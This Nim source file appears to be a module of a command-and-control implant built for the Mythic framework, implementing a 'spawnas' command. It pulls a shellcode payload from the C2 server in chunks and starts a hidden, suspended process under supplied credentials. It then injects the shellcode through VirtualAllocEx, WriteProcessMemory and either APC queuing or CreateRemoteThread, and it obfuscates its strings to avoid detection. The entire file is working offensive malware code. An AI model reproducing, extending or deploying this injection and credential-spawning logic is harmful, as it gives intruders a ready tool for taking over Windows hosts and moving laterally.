import ../utils/m_responses
import ../utils/debug
import ../global_data
import ../utils/strenc
import std/[json, strutils, strformat, base64]

when defined(windows):
  import winim/lean

type
  SpawnAsArgs = object
    uuid: string
    technique: string
    username: string
    password: string
    domain: string
    netonly: bool

proc spawnas*(taskId: string, params: JsonNode): JsonNode =
  ## Spawn a new callback as another user - downloads payload, creates process
  ## with alternate credentials, and injects shellcode
  when defined(windows):
    try:
      let args = to(params, SpawnAsArgs)
      debug &"[DEBUG] SpawnAs: user={args.domain}\\{args.username}, technique={args.technique}, uuid={args.uuid}"
      
      # Return initial response to request the payload file from Mythic
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("file_id"): args.uuid,
          obf("chunk_num"): 1,
          obf("chunk_size"): 512000,
          obf("full_path"): ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, obf("SpawnAs error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawnas command is only available on Windows"))

proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc processSpawnAsChunk*(taskId: string, params: JsonNode, chunkData: string,
                          totalChunks: int, currentChunk: int,
                          fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the payload file being downloaded
  when defined(windows):
    try:
      let args = to(params, SpawnAsArgs)
      
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] SpawnAs: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("chunk_size"): 512000,
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("full_path"): ""
          }
        }
      
      return executeSpawnAs(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, obf("SpawnAs chunk processing error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawnas command is only available on Windows"))

proc executeSpawnAs*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the spawnas after download is complete - create process as user and inject
  when defined(windows):
    try:
      let args = to(params, SpawnAsArgs)
      
      if shellcode.len == 0:
        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
      
      # Get spawnto path
      when hostCPU == "amd64":
        let (spawntoPath, _) = getSpawntoX64()
      else:
        let (spawntoPath, _) = getSpawntoX86()
      
      if spawntoPath.len == 0:
        return mythicError(taskId, obf("spawnto path is not set for this architecture"))
      
      # Create process with alternate credentials using CreateProcessWithLogonW
      var wUsername = newWideCString(args.username)
      var wDomain = newWideCString(if args.domain.len > 0: args.domain else: ".")
      var wPassword = newWideCString(args.password)
      var wProgram = newWideCString(spawntoPath)
      
      # Logon flags
      let logonFlags: DWORD = if args.netonly: 0x2 else: 0x1  # LOGON_NETCREDENTIALS_ONLY or LOGON_WITH_PROFILE
      
      var si: STARTUPINFOW
      si.cb = sizeof(STARTUPINFOW).DWORD
      si.dwFlags = STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      var pi: PROCESS_INFORMATION
      
      debug &"[DEBUG] SpawnAs: Creating process as {args.domain}\\{args.username}"
      
      let createResult = CreateProcessWithLogonW(
        wUsername,
        wDomain,
        wPassword,
        logonFlags,
        wProgram,
        wProgram,
        CREATE_SUSPENDED or CREATE_NEW_CONSOLE,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      if createResult == 0:
        let err = GetLastError()
        var errMsg = obf("CreateProcessWithLogonW failed: ")
        case err
        of ERROR_LOGON_FAILURE:
          errMsg.add(obf("Logon failure: incorrect username or password"))
        of ERROR_ACCOUNT_RESTRICTION:
          errMsg.add(obf("Account restriction"))
        of ERROR_INVALID_ACCOUNT_NAME:
          errMsg.add(obf("Invalid account name"))
        of ERROR_PASSWORD_EXPIRED:
          errMsg.add(obf("Password expired"))
        of ERROR_ACCOUNT_DISABLED:
          errMsg.add(obf("Account disabled"))
        else:
          errMsg.add(obf("error ") & $err)
        return mythicError(taskId, errMsg)
      
      let pid = pi.dwProcessId
      
      # Inject shellcode into the suspended process
      let pRemote = VirtualAllocEx(pi.hProcess, nil, SIZE_T(shellcode.len),
                                    MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
      if pRemote == nil:
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return mythicError(taskId, obf("VirtualAllocEx failed: ") & $GetLastError())
      
      var bytesWritten: SIZE_T
      if WriteProcessMemory(pi.hProcess, pRemote, unsafeAddr shellcode[0],
                            SIZE_T(shellcode.len), addr bytesWritten) == 0:
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return mythicError(taskId, obf("WriteProcessMemory failed: ") & $GetLastError())
      
      case args.technique.toLower()
      of obf("apc"):
        if QueueUserAPC(cast[PAPCFUNC](pRemote), pi.hThread, 0) == 0:
          discard TerminateProcess(pi.hProcess, 0)
          CloseHandle(pi.hProcess)
          CloseHandle(pi.hThread)
          return mythicError(taskId, obf("QueueUserAPC failed: ") & $GetLastError())
      of obf("createremotethread"):
        var threadId: DWORD
        let hThread = CreateRemoteThread(pi.hProcess, nil, 0,
                                          cast[LPTHREAD_START_ROUTINE](pRemote),
                                          nil, 0, addr threadId)
        if hThread == 0:
          discard TerminateProcess(pi.hProcess, 0)
          CloseHandle(pi.hProcess)
          CloseHandle(pi.hThread)
          return mythicError(taskId, obf("CreateRemoteThread failed: ") & $GetLastError())
        CloseHandle(hThread)
      else:
        discard TerminateProcess(pi.hProcess, 0)
        CloseHandle(pi.hProcess)
        CloseHandle(pi.hThread)
        return mythicError(taskId, obf("Unknown injection technique: ") & args.technique)
      
      # Only resume the main thread for APC injection (APC fires on resume).
      # For CreateRemoteThread, the shellcode runs on its own thread.
      if args.technique.toLower() == obf("apc"):
        discard ResumeThread(pi.hThread)
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      
      let logonType = if args.netonly: obf("network-only") else: obf("interactive")
      
      return mythicSuccess(taskId, obf("SpawnAs: Successfully spawned as ") &
                           args.domain & "\\" & args.username &
                           obf(" (") & logonType & obf(") into ") & spawntoPath &
                           obf(" (PID: ") & $pid & obf(") via ") & args.technique)
      
    except Exception as e:
      return mythicError(taskId, obf("SpawnAs execution error: ") & e.msg)
  else:
    return mythicError(taskId, obf("spawnas command is only available on Windows"))
